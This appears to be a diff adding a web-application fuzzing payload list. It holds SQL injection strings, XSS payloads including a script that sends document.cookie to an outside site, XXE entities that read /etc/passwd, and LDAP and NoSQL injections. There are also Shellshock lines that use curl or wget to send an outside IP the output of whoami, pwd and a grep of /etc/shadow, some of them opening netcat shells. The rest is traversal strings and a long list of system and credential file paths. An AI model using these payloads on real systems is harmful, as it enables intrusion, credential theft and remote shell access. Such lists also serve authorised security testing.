+')oR true/*
+')oR true#
+')oR'2'-- 2
+')oR'2'/*
+')oR'2'#
+')oR'2'='2' LimIT 1-- 2
+')oR'2'='2' LimIT 1/*
+')oR'2'='2' LimIT 1#
+')oR'2'='2'-- 2
+')oR'2'='2'/*
+')oR'2'='2'#
+')oR'2'='2'oR('
+')oR'2'=('2
+')oR'2'LiKE'2'-- 2
+')oR'2'LiKE'2'/*
+')oR'2'LiKE'2'#
+')oR'2'LiKE'2'oR('
+')oR'2'LiKE('2
+')oR'2'oR('
+')oR('2
+')oR(2)-- 2
+')oR(2)/*
+')oR(2)#
+')oR(2)=(2)LimIT(1)-- 2
+')oR(2)=(2)LimIT(1)/*
+')oR(2)=(2)LimIT(1)#
+')oR(2)=(2)oR('
+')oR(2)=2-- 2
+')oR(2)=2/*
+')oR(2)=2#
+')oR(2)LiKE(2)-- 2
+')oR(2)LiKE(2)/*
+')oR(2)LiKE(2)#
+')oR(2)LiKE(2)oR('
+')oR(2)oR('
+')oR(true)-- 2
+')oR(true)/*
+')oR(true)#
+')oR(true)oR('
+')oR/**/2-- 2
+')oR/**/2/*
+')oR/**/2/**/oR('
+')oR/**/2#
+')oR/**/2=2-- 2
+')oR/**/2=2/*
+')oR/**/2=2/**/oR('
+')oR/**/2=2#
+')oR/**/true-- 2
+')oR/**/true/*
+')oR/**/true/**/oR('
+')oR/**/true#
+')UniON(SElecT(1),2,3,4,5)-- 2
+')UniON(SElecT(1),2,3,4,5)#
+')UniON(SElecT(1),2,3,4)-- 2
+')UniON(SElecT(1),2,3,4)#
+')UniON(SElecT(1),2,3)-- 2
+')UniON(SElecT(1),2,3)#
+')UniON(SElecT(1),2)-- 2
+')UniON(SElecT(1),2)#
+'*'
+'*''-- 2
+'*''/*
+'*''#
+'/*
+'\"><img src=1>.png
+'&'
+'&''-- 2
+'&''/*
+'&''#
+'#
+'%20%26%26%20this.password.match(/.*/)//+%00
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+'%20or%201=1
+'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
+'^'
+'^''-- 2
+'^''/*
+'^''#
+'='
+'=' 'or' and '=' 'or'
+'=''-- 2
+'=''/*
+'=''#
+'="or'
+'=0--+
+'><script>alert(document.cookie);</script>
+'><script>alert(document.cookie)</script>
+'||'2
+'||'2'='2
+'||'2'='2'||'
+'||'2'||'
+'||'2'LiKE'2
+'||'2'LiKE'2'-- 2
+'||'2'LiKE'2'/*
+'||'2'LiKE'2'#
+'||'2'LiKE'2'||'
+'||(2)LiKE(2)-- 2
+'||(2)LiKE(2)/*
+'||(2)LiKE(2)#
+'||(2)LiKE(2)||'
+'||2-- 2
+'||2/*
+'||2#
+'||2=(2)LimIT(1)-- 2
+'||2=(2)LimIT(1)/*
+'||2=(2)LimIT(1)#
+'||2=2-- 2
+'||2=2/*
+'||2=2#
+'||2=2||'
+'||2||'
+'||true-- 2
+'||true/*
+'||true#
+'||true||'
+'||UTL_HTTP.REQUEST
+'||Utl_Http.request('http://<yourservername>') from dual--
+'create user name identified by 'pass123' --
+'create user name identified by pass123 temporary tablespace temp default tablespace users; 
+'exec sp_addlogin 'name' , 'password' --
+'hi' or 'x'='x';
+'i'd
+'id'
+'LIKE'
+'or 1=1 or ''='
+'oR 2 oR'
+'oR 2-- 2
+'oR 2/*
+'oR 2#
+'oR 2=2 oR'
+'oR 2=2-- 2
+'oR 2=2/*
+'oR 2=2#
+'or contains(.,'adm') or'
+'or contains(name,'adm') or'
+'or position()=2 or'
+'or select *
+'or string-length(name(.))&lt;10 or'
+'oR true oR'
+'oR true-- 2
+'oR true/*
+'oR true#
+'or'1=1
+'or'1=1′
+'oR'2
+'oR'2'-- 2
+'oR'2'/*
+'oR'2'#
+'oR'2'='2
+'oR'2'='2' LimIT 1-- 2
+'oR'2'='2' LimIT 1/*
+'oR'2'='2' LimIT 1#
+'oR'2'='2'-- 2
+'oR'2'='2'/*
+'oR'2'='2'#
+'oR'2'='2'oR'
+'oR'2'LiKE'2
+'oR'2'LiKE'2'-- 2
+'oR'2'LiKE'2'/*
+'oR'2'LiKE'2'#
+'oR'2'LiKE'2'oR'
+'oR'2'oR'
+'oR(2)-- 2
+'oR(2)/*
+'oR(2)#
+'oR(2)=(2)LimIT(1)-- 2
+'oR(2)=(2)LimIT(1)/*
+'oR(2)=(2)LimIT(1)#
+'oR(2)=(2)oR'
+'oR(2)=2-- 2
+'oR(2)=2/*
+'oR(2)=2#
+'oR(2)LiKE(2)-- 2
+'oR(2)LiKE(2)/*
+'oR(2)LiKE(2)#
+'oR(2)LiKE(2)oR'
+'oR(2)oR'
+'oR(true)-- 2
+'oR(true)/*
+'oR(true)#
+'oR(true)oR'
+'oR/**/2-- 2
+'oR/**/2/*
+'oR/**/2/**/oR'
+'oR/**/2#
+'oR/**/2=2-- 2
+'oR/**/2=2/*
+'oR/**/2=2/**/oR'
+'oR/**/2=2#
+'oR/**/true-- 2
+'oR/**/true/*
+'oR/**/true/**/oR'
+'oR/**/true#
+'sqlattempt1
+'UniON(SElecT(1),2,3,4,5)-- 2
+'UniON(SElecT(1),2,3,4,5)#
+'UniON(SElecT(1),2,3,4)-- 2
+'UniON(SElecT(1),2,3,4)#
+'UniON(SElecT(1),2,3)-- 2
+'UniON(SElecT(1),2,3)#
+'UniON(SElecT(1),2)-- 2
+'UniON(SElecT(1),2)#
+"
+" --
+" "
+" #
+" `id`
+" `id` #
+" AND 1=0 UNION ALL SELECT "", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220
+" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
+" id
+“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+" or "" "
+" OR "" = "
+" or ""-"
+" or ""*"
+" or ""&"
+" or ""^"
+" or ""="
+" or "1"="1
+" or "1"="1"--
+" or "1"="1"/*
+" or "1"="1"#
+" or "a"="a
+” or “a”=”a
+" or "x"="x
+” or “x”=”x
+" or 0=0 --
+" or 0=0 –
+” or 0=0 –
+" or 0=0 #
+” or 0=0 #
+" OR 1 = 1 -- -
+" or 1=1
+" or 1=1 --
+" or 1=1 –
+" or 1=1 or ""="
+" or 1=1--
+" or 1=1-- -
+" or 1=1–
+” or 1=1–
+" or 1=1/*
+" or 1=1#
+" or true--
+" UniON SElecT 1,2-- 2
+" UniON SElecT 1,2,3-- 2
+" UniON SElecT 1,2,3,4-- 2
+" UniON SElecT 1,2,3,4,5-- 2
+" UniON SElecT 1,2,3,4,5#
+" UnION SELeCT 1,2,3,4,5`
+" UniON SElecT 1,2,3,4#
+" UnION SELeCT 1,2,3,4`
+" UniON SElecT 1,2,3#
+" UnION SELeCT 1,2,3`
+" UniON SElecT 1,2#
+" UnION SELeCT 1,2`
+" waitfor delay '0:0:20' --
+" waitfor delay '0:0:20' /* 
+"-- 2
+"-"
+"-""-- 2
+"-""/*
+"-""#
+",
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",system('ls');" double quote Rce filter bypass
+";cat+/etc/passwd+#
+"' or 1 --'"
+""
+")
+") #
+") or "1"="1
+") or "1"="1"--
+") or "1"="1"/*
+") or "1"="1"#
+") or ("1"="1
+") or ("1"="1"--
+") or ("1"="1"/*
+") or ("1"="1"#
+") or ("a"="a
+“) or (“a”=”a
+") or ("x")=("x
+") or 1=1-- -
+") or 1=1/*
+") or 1=1#
+") or true--
+") UniON SElecT 1,2-- 2
+") UniON SElecT 1,2,3-- 2
+") UniON SElecT 1,2,3,4-- 2
+") UniON SElecT 1,2,3,4,5-- 2
+") UniON SElecT 1,2,3,4,5#
+") UniON SElecT 1,2,3,4#
+") UniON SElecT 1,2,3#
+") UniON SElecT 1,2#
+") waitfor delay '0:0:20' --
+") waitfor delay '0:0:20' /* 
+")-- 2
+")-""-- 2
+")-""/*
+")-""#
+")-("
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL)%20waitfor%20delay%20'0:0:20'%20/*
+")) or (("x"))=(("x
+")) waitfor delay '0:0:20' --
+")) waitfor delay '0:0:20' /* 
+"))) waitfor delay '0:0:20' --
+"))) waitfor delay '0:0:20' /* 
+")))) waitfor delay '0:0:20' --
+")))) waitfor delay '0:0:20' /* 
+"))))) waitfor delay '0:0:20' --
+"))))) waitfor delay '0:0:20' /* 
+")))))) waitfor delay '0:0:20' --
+")))))) waitfor delay '0:0:20' /* 
+"))%20waitfor%20delay%20'0:0:20'%20--
+"))%20waitfor%20delay%20'0:0:20'%20/*
+")*""-- 2
+")*""/*
+")*""#
+")*("
+")/*
+")&""-- 2
+")&""/*
+")&""#
+")&("
+")%20waitfor%20delay%20'0:0:20'%20--
+")%20waitfor%20delay%20'0:0:20'%20/*
+")^""-- 2
+")^""/*
+")^""#
+")^("
+")=""-- 2
+")=""/*
+")=""#
+")=("
+")||"2"="2"||("
+")||"2"=("2
+")||"2"||("
+")||"2"LiKE"2"-- 2
+")||"2"LiKE"2"/*
+")||"2"LiKE"2"#
+")||"2"LiKE"2"||("
+")||"2"LiKE("2
+")||("2
+")||(2)LiKE(2)-- 2
+")||(2)LiKE(2)/*
+")||(2)LiKE(2)#
+")||(2)LiKE(2)||("
+")||2-- 2
+")||2/*
+")||2#
+")||2=(2)LimIT(1)-- 2
+")||2=(2)LimIT(1)/*
+")||2=(2)LimIT(1)#
+")||2=2-- 2
+")||2=2/*
+")||2=2#
+")||2=2||("
+")||2||("
+")||true-- 2
+")||true/*
+")||true#
+")||true||("
+")oR 2 oR("
+")oR 2-- 2
+")oR 2/*
+")oR 2#
+")oR 2=2 oR("
+")oR 2=2-- 2
+")oR 2=2/*
+")oR 2=2#
+")oR true oR("
+")oR true-- 2
+")oR true/*
+")oR true#
+")oR"2"-- 2
+")oR"2"/*
+")oR"2"#
+")oR"2"="2" LimIT 1-- 2
+")oR"2"="2" LimIT 1/*
+")oR"2"="2" LimIT 1#
+")oR"2"="2"-- 2
+")oR"2"="2"/*
+")oR"2"="2"#
+")oR"2"="2"oR("
+")oR"2"=("2
+")oR"2"LiKE"2"-- 2
+")oR"2"LiKE"2"/*
+")oR"2"LiKE"2"#
+")oR"2"LiKE"2"oR("
+")oR"2"LiKE("2
+")oR"2"oR("
+")oR("2
+")oR(2)-- 2
+")oR(2)/*
+")oR(2)#
+")oR(2)=(2)LimIT(1)-- 2
+")oR(2)=(2)LimIT(1)/*
+")oR(2)=(2)LimIT(1)#
+")oR(2)=(2)oR("
+")oR(2)=2-- 2
+")oR(2)=2/*
+")oR(2)=2#
+")oR(2)LiKE(2)-- 2
+")oR(2)LiKE(2)/*
+")oR(2)LiKE(2)#
+")oR(2)LiKE(2)oR("
+")oR(2)oR("
+")oR(true)-- 2
+")oR(true)/*
+")oR(true)#
+")oR(true)oR("
+")oR/**/2-- 2
+")oR/**/2/*
+")oR/**/2/**/oR("
+")oR/**/2#
+")oR/**/2=2-- 2
+")oR/**/2=2/*
+")oR/**/2=2/**/oR("
+")oR/**/2=2#
+")oR/**/true-- 2
+")oR/**/true/*
+")oR/**/true/**/oR("
+")oR/**/true#
+")UniON(SElecT(1),2,3,4,5)-- 2
+")UniON(SElecT(1),2,3,4,5)#
+")UniON(SElecT(1),2,3,4)-- 2
+")UniON(SElecT(1),2,3,4)#
+")UniON(SElecT(1),2,3)-- 2
+")UniON(SElecT(1),2,3)#
+")UniON(SElecT(1),2)-- 2
+")UniON(SElecT(1),2)#
+"*"
+"*""-- 2
+"*""/*
+"*""#
+"/*
+"\t"
+"&"
+"&""-- 2
+"&""/*
+"&""#
+"^"
+"^""-- 2
+"^""/*
+"^""#
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////dev/random"">]><foo>&xxe;</foo>"
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/passwd"">]><foo>&xxe;</foo>"
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[' or 1=1 or ''=']]></foo>"
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>"
+"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc""><xss:xss>XSS</xss:xss></HTML>"
+"<xml ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert('XSS')""></B></I></xml><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
+"<xml ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>"
+"<xml SRC=""xsstest.xml"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
+"="
+"=""-- 2
+"=""/*
+"=""#
+"><script>"
+"><script>alert(1)</script>
+"><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'+document.cookie</script>
+">xxx<P>yyy
+"||"2
+"||"2"="2
+"||"2"="2"||"
+"||"2"||"
+"||"2"LiKE"2
+"||"2"LiKE"2"-- 2
+"||"2"LiKE"2"/*
+"||"2"LiKE"2"#
+"||"2"LiKE"2"||"
+"||(2)LiKE(2)-- 2
+"||(2)LiKE(2)/*
+"||(2)LiKE(2)#
+"||(2)LiKE(2)||"
+"||2-- 2
+"||2/*
+"||2#
+"||2=(2)LimIT(1)-- 2
+"||2=(2)LimIT(1)/*
+"||2=(2)LimIT(1)#
+"||2=2-- 2
+"||2=2/*
+"||2=2#
+"||2=2||"
+"||2||"
+"||true-- 2
+"||true/*
+"||true#
+"||true||"
+"i"d
+"id"
+"or 1=1 or ""="
+"oR 2 oR"
+"oR 2-- 2
+"oR 2/*
+"oR 2#
+"oR 2=2 oR"
+"oR 2=2-- 2
+"oR 2=2/*
+"oR 2=2#
+"oR true oR"
+"oR true-- 2
+"oR true/*
+"oR true#
+"oR"2
+"oR"2"-- 2
+"oR"2"/*
+"oR"2"#
+"oR"2"="2
+"oR"2"="2" LimIT 1-- 2
+"oR"2"="2" LimIT 1/*
+"oR"2"="2" LimIT 1#
+"oR"2"="2"-- 2
+"oR"2"="2"/*
+"oR"2"="2"#
+"oR"2"="2"oR"
+"oR"2"LiKE"2
+"oR"2"LiKE"2"-- 2
+"oR"2"LiKE"2"/*
+"oR"2"LiKE"2"#
+"oR"2"LiKE"2"oR"
+"oR"2"oR"
+"oR(2)-- 2
+"oR(2)/*
+"oR(2)#
+"oR(2)=(2)LimIT(1)-- 2
+"oR(2)=(2)LimIT(1)/*
+"oR(2)=(2)LimIT(1)#
+"oR(2)=(2)oR"
+"oR(2)=2-- 2
+"oR(2)=2/*
+"oR(2)=2#
+"oR(2)LiKE(2)-- 2
+"oR(2)LiKE(2)/*
+"oR(2)LiKE(2)#
+"oR(2)LiKE(2)oR"
+"oR(2)oR"
+"oR(true)-- 2
+"oR(true)/*
+"oR(true)#
+"oR(true)oR"
+"oR/**/2-- 2
+"oR/**/2/*
+"oR/**/2/**/oR"
+"oR/**/2#
+"oR/**/2=2-- 2
+"oR/**/2=2/*
+"oR/**/2=2/**/oR"
+"oR/**/2=2#
+"oR/**/true-- 2
+"oR/**/true/*
+"oR/**/true/**/oR"
+"oR/**/true#
+"UniON(SElecT(1),2,3,4,5)-- 2
+"UniON(SElecT(1),2,3,4,5)#
+"UniON(SElecT(1),2,3,4)-- 2
+"UniON(SElecT(1),2,3,4)#
+"UniON(SElecT(1),2,3)-- 2
+"UniON(SElecT(1),2,3)#
+"UniON(SElecT(1),2)-- 2
+"UniON(SElecT(1),2)#
+(
+(')
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=5"
+() { :;}; /bin/bash -c "sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6"
+() { :;}; /bin/bash -c "sleep 1 && echo vulnerable 1"
+() { :;}; /bin/bash -c "sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7"
+() { :;}; /bin/bash -c "sleep 3 && echo vulnerable 3"
+() { :;}; /bin/bash -c "sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8"
+() { :;}; /bin/bash -c "sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9"
+() { :;}; /bin/bash -c "sleep 6 && echo vulnerable 6"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=4"
+(id
+(id)
+(sqlattempt2)
+(sy.(st).em)(whoami);
+)
+) or '1′='1–
+) or ('1′='1–
+) waitfor delay '0:0:20' --
+) waitfor delay '0:0:20' /* 
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL)%20waitfor%20delay%20'0:0:20'%20/*
+);id
+);id;
+);id|
+)) waitfor delay '0:0:20' --
+)) waitfor delay '0:0:20' /* 
+))) waitfor delay '0:0:20' --
+))) waitfor delay '0:0:20' /* 
+)))) waitfor delay '0:0:20' --
+)))) waitfor delay '0:0:20' /* 
+))))) waitfor delay '0:0:20' --
+)))))) waitfor delay '0:0:20' --
+))))))))))
+))%20waitfor%20delay%20'0:0:20'%20--
+))%20waitfor%20delay%20'0:0:20'%20/*
+)%20waitfor%20delay%20'0:0:20'%20--
+)%20waitfor%20delay%20'0:0:20'%20/*
+)|id
+)|id;
+)id 
+[']
+[&apos;]
+[$ne]=1
+]>
+{ $ne: 1 }
+{'}
+{{ get_user_file("/etc/passwd") }}
+{{10000+1}}.jpg
+{{10001*2}}.jpg
+{}
+{&apos;}
+{$gt: ''}
+{uname,-a}
+}
+@'
+@*
+@&apos;
+@variable
+*
+*'
+*(|(mail=*))
+*(|(objectclass=*))
+*)(&
+*)(|(*
+*)(|(&
+*))%00
+**id**
+*/*
+*&apos;
+*|
+*id
+*id*
+/
+/,%ENV,/
+/???/??t+/???/??ss??
+/???/c?t /?tc/?as?wd
+/???/c?t /etc/passwd
+/?in/cat+/et?/passw?
+/.../.../.../.../.../
+/../../../../../../../../../../../boot.ini
+/../../../../../../../../../../../boot.ini%00
+/../../../../../../../../../../../boot.ini%00.html
+/../../../../../../../../../../../boot.ini%00.jpg
+/../../../../../../../../../../../etc/passwd%00.html
+/../../../../../../../../../../../etc/passwd%00.jpg
+/../../../../../../../../../../etc/passwd
+/../../../../../../../../../../etc/passwd^^
+/../../../../../../../../../../etc/shadow
+/../../../../../../../../../../etc/shadow^^
+/../../../../../../../../%2A
+/../../../../../../../../bin/id|
+/../../../../pswd
+/../../var/www/logs/access_log
+/..\../..\../..\../..\../..\../..\../boot.ini
+/..\../..\../..\../..\../..\../..\../etc/passwd
+/..\../..\../..\../..\../..\../..\../etc/shadow
+/..\..\..\..\..\..\winnt\win.ini
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow
+/./././././././././././boot.ini
+/./././././././././././etc/passwd
+/./././././././././././etc/shadow
+/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini
+/.bash_history
+/.bash_profile
+/.bashrc
+/.cshrc
+/.forward
+/.htpasswd
+/.logout
+/.netrc
+/.passwd
+/.profile
+/.rhosts
+/.sh_history
+/.shosts
+/.ssh/authorized_keys
+/.Xauthority
+/'
+/*$(id)`id`
+/*$(id)`id``*/-id-'/*$(id)`id` #*/-id||'"||id||"/*`*/
+/*$(id)`id``*/id'/*$(id)`id` #*/id||'"||id||"/*`*/
+//
+//*
+///////../../../etc/passwd
+/&apos;
+/%00/
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini
+/%2A
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+/admin/install.php
+/apache/logs/access_log
+/apache/logs/access.log
+/apache/logs/error_log
+/apache/logs/error.log
+/apache\php\php.ini
+/apache2/logs/access_log
+/apache2/logs/access.log
+/apache2/logs/error_log
+/apache2/logs/error.log
+/bin/php.ini
+/bin$u/bash$u <ip> <port>
+/boot.ini
+/boot/grub/grub.conf
+/C:/inetpub/ftproot/
+/C:\Program Files\
+/config.asp
+/core/config.php
+/D:\Program Files\
+/etc/apache/apache.conf
+/etc/apache/conf/httpd.conf
+/etc/apache/httpd.conf
+/etc/apache2/.htpasswd
+/etc/apache2/apache2.conf
+/etc/apache2/conf/httpd.conf
+/etc/apache2/httpd.conf
+/etc/apache2/sites-available/default
+/etc/apache2/vhosts.d/default_vhost.include
+/etc/apt/sources.list
+/etc/chrootUsers
+/etc/crontab
+/etc/default/passwd
+/etc/defaultdomain
+/etc/defaultrouter
+/etc/fstab
+/etc/ftpchroot
+/etc/ftphosts
+/etc/group
+/etc/hostname.bge
+/etc/hostname.ce0
+/etc/hostname.ce1
+/etc/hostname.ce2
+/etc/hostname.ce3
+/etc/hostname.dcelx0
+/etc/hostname.dcelx1
+/etc/hostname.dcelx2
+/etc/hostname.dcelx3
+/etc/hostname.dmfe0
+/etc/hostname.dmfe1
+/etc/hostname.dmfe2
+/etc/hostname.dmfe3
+/etc/hostname.dnet0
+/etc/hostname.dnet1
+/etc/hostname.dnet2
+/etc/hostname.dnet3
+/etc/hostname.ecn0
+/etc/hostname.ecn1
+/etc/hostname.ecn2
+/etc/hostname.ecn3
+/etc/hostname.elx0
+/etc/hostname.elx1
+/etc/hostname.elx2
+/etc/hostname.elx3
+/etc/hostname.elxl0
+/etc/hostname.elxl1
+/etc/hostname.elxl2
+/etc/hostname.elxl3
+/etc/hostname.eri0
+/etc/hostname.eri1
+/etc/hostname.eri2
+/etc/hostname.eri3
+/etc/hostname.ge0
+/etc/hostname.ge1
+/etc/hostname.ge2
+/etc/hostname.ge3
+/etc/hostname.hme0
+/etc/hostname.hme1
+/etc/hostname.hme2
+/etc/hostname.hme3
+/etc/hostname.ieef0
+/etc/hostname.ieef1
+/etc/hostname.ieef2
+/etc/hostname.ieef3
+/etc/hostname.iprb0
+/etc/hostname.iprb1
+/etc/hostname.iprb2
+/etc/hostname.iprb3
+/etc/hostname.le0
+/etc/hostname.le1
+/etc/hostname.le2
+/etc/hostname.le3
+/etc/hostname.lo
+/etc/hostname.pcn0
+/etc/hostname.pcn1
+/etc/hostname.pcn2
+/etc/hostname.pcn3
+/etc/hostname.qfe0
+/etc/hostname.qfe1
+/etc/hostname.qfe2
+/etc/hostname.qfe3
+/etc/hostname.spwr0
+/etc/hostname.spwr1
+/etc/hostname.spwr2
+/etc/hostname.spwr3
+/etc/hosts
+/etc/hosts.allow
+/etc/hosts.deny
+/etc/hosts.equiv
+/etc/http/conf/httpd.conf
+/etc/http/httpd.conf
+/etc/httpd.conf
+/etc/httpd/conf.d/php.conf
+/etc/httpd/conf.d/squirrelmail.conf
+/etc/httpd/conf.d/ssl.conf
+/etc/httpd/conf/httpd.conf
+/etc/httpd/httpd.conf
+/etc/httpd/logs/acces_log
+/etc/httpd/logs/acces.log
+/etc/httpd/logs/access_log
+/etc/httpd/logs/access.log
+/etc/httpd/logs/error_log
+/etc/httpd/logs/error.log
+/etc/httpd/php.ini
+/etc/inetd.conf
